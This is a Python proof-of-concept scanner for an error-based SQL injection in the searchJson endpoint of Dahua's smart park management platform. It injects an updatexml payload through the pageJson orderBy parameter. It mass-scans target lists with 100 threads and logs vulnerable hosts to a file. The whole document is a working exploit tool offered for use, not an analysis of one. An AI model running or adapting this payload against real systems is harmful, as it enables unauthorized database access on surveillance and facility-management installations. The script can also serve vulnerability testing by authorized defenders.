import requests,argparse,sys,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()


# 横幅
def banner():
    test = """   ███████ ███████  █████  ██████   ██████ ██   ██      ██ ███████  ██████  ███    ██     ███████  ██████  ██      
██      ██      ██   ██ ██   ██ ██      ██   ██      ██ ██      ██    ██ ████   ██     ██      ██    ██ ██      
███████ █████   ███████ ██████  ██      ███████      ██ ███████ ██    ██ ██ ██  ██     ███████ ██    ██ ██      
     ██ ██      ██   ██ ██   ██ ██      ██   ██ ██   ██      ██ ██    ██ ██  ██ ██          ██ ██ ▄▄ ██ ██      
███████ ███████ ██   ██ ██   ██  ██████ ██   ██  █████  ███████  ██████  ██   ████     ███████  ██████  ███████ 
                                                                                                   ▀▀           
                                                                    author:hqy
                                                                    version:1.0.0
                                                            
"""
    print(test)


def main():
    banner()
# 处理命令行参数
    # 初始化 
    parser = argparse.ArgumentParser(description="大华智慧园区综合管理平台 searchJson SQL注入漏洞")
    
    # 添加参数
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')


    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    if args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select+md5%281%29),0x7e),1)--%22%7D/extend/%7B%7D'
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    try:
        res1 = requests.get(url=target+payload,headers=headers,verify=False)
    except:
        pass
    try:
        match = re.search(r'XPATH syntax error: \'(~[0-9a-fA-F]+)\'',res1.text)
        if '~c4ca4238a0b923820dcc509a6f75849' in match[0]:
            print(f"[+]{target} have loophole")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} not have loophole")
    except:
        pass

# 函数入口 
if __name__ == "__main__":
    main()
















